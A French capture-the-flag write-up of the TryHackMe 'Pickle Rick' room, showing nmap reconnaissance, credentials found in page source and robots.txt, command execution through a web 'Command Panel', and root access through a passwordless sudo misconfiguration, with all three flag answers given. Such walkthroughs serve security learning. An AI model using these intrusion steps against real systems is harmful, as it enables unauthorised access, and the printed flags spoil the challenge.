---

# Write-up : TryHackMe - Pickle Rick

**Date :** 28/12/2025
**Auteur :** [Ton Pseudo]
**Catégorie :** Web / Linux
**Difficulté :** Facile
**Lien :** [TryHackMe | Pickle Rick](https://tryhackme.com/room/picklerick)

---

## 1. Introduction & Scénario

Rick s'est transformé en cornichon et a besoin d'aide pour redevenir humain. L'objectif est de retrouver **3 ingrédients** cachés sur le serveur web pour préparer sa potion.
D'un point de vue technique, ce challenge consiste à énumérer un serveur web, exploiter une interface de commande pour obtenir un accès initial, et effectuer une escalade de privilèges sur un système Linux.

---

## 2. Reconnaissance & Énumération

### Scan Nmap

La première étape consiste à scanner l'adresse IP cible pour identifier les services actifs. J'utilise les options `-sC` (scripts par défaut) et `-sV` (versions des services).

```bash
nmap -sC -sV 10.82.144.75

```

**Résultats du scan :**

* **Port 22 (SSH) :** OpenSSH (version récente, difficile à exploiter directement).
* **Port 80 (HTTP) :** Serveur Apache 2.4.41 (Ubuntu).

Le port 80 étant ouvert, la surface d'attaque principale semble être l'application web.

### Énumération Web

En accédant à l'adresse IP via le navigateur, je tombe sur une page statique. J'inspecte le **code source** (Ctrl+U) à la recherche d'indices cachés.

> **Découverte 1 :** Un commentaire HTML révèle un nom d'utilisateur potentiel.
> ``

Je note également des appels vers un dossier `/assets/`, ce qui confirme l'existence de répertoires spécifiques.

En parallèle, j'effectue une énumération des fichiers et répertoires (via script Nmap ou Gobuster) et j'identifie deux fichiers intéressants :

* `/login.php` : Une page de connexion.
* `/robots.txt` : Un fichier destiné aux bots d'indexation.

Je consulte le fichier `robots.txt` (`http://10.82.144.75/robots.txt`) et je trouve la chaîne de caractères suivante :
`Wubbalubbadubdub`

---

## 3. Accès Initial

Je me rends sur la page `/login.php`. J'utilise les informations récoltées lors de la phase d'énumération :

* **Utilisateur :** `R1ckRul3s` (trouvé dans le code source)
* **Mot de passe :** `Wubbalubbadubdub` (trouvé dans robots.txt)

La connexion réussit et je suis redirigé vers `/portal.php`.

### Exploitation (Command Injection)

L'interface présente un "Command Panel". J'ai un champ de saisie qui semble exécuter des commandes sur le système. Pour vérifier cette hypothèse, je teste la commande `ls`.

**Output :**

```text
Sup3rS3cretPickl3Ingred.txt
assets
clue.txt
denied.php
index.html
login.php
portal.php
robots.txt

```

Cela confirme que nous avons une exécution de code à distance (RCE) et que nous pouvons interagir avec le système de fichiers.

---

## 4. Récupération des Ingrédients

### Ingrédient n°1

Le premier fichier listé est explicite : `Sup3rS3cretPickl3Ingred.txt`.
Puisque je suis sur un serveur web, je peux simplement y accéder via l'URL pour lire son contenu, ou utiliser une commande `less` ou `cat` dans le panneau.

**Accès :** `http://10.82.144.75/Sup3rS3cretPickl3Ingred.txt`
**Flag 1 :** `mr. meeseek hair`

### Ingrédient n°2

Je lis ensuite le fichier `clue.txt` présent dans le répertoire courant.

> *Indice : "Look around the file system for the other ingredient."*

Je commence par explorer les dossiers utilisateurs via le panneau de commande :

```bash
ls /home
# Résultat : rick ubuntu

```

Je liste le contenu du dossier de l'utilisateur `rick` :

```bash
ls /home/rick
# Résultat : "second ingredients"

```

Le nom du fichier contient un espace, il faut donc utiliser des guillemets pour le lire. Note : La commande `cat` étant souvent filtrée dans ce type de challenge, j'utilise `less` (ou `head/tail`).

```bash
less "/home/rick/second ingredients"

```

**Flag 2 :** `1 jerry tear`

---

## 5. Escalade de Privilèges & Ingrédient n°3

Pour obtenir le dernier ingrédient, il faut probablement des droits `root`. Je vérifie les permissions `sudo` de l'utilisateur actuel (généralement `www-data`) pour voir ce que je peux exécuter sans mot de passe.

```bash
sudo -l

```

**Résultat :**

```text
Matching Defaults entries for www-data on ip-10-82-144-75:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User www-data may run the following commands on ip-10-82-144-75:
    (ALL) NOPASSWD: ALL

```

C'est une faille critique de mauvaise configuration. L'utilisateur web peut exécuter **n'importe quelle commande** en tant que root sans fournir de mot de passe.

Je liste le répertoire root :

```bash
sudo ls /root
# Résultat : 3rd.txt snap

```

Je lis le dernier fichier :

```bash
sudo less /root/3rd.txt

```

**Flag 3 :** `fleeb juice`

---

## Conclusion

Ce CTF permet de revoir les bases essentielles du pentest web :

1. **L'importance de l'énumération :** Code source, robots.txt et scan de ports.
2. **L'injection de commande :** Savoir repérer et exploiter un champ input mal sécurisé.
3. **L'escalade de privilèges :** Vérifier systématiquement `sudo -l` pour trouver des erreurs de configuration basiques.

**Défis réussis !** 🥒
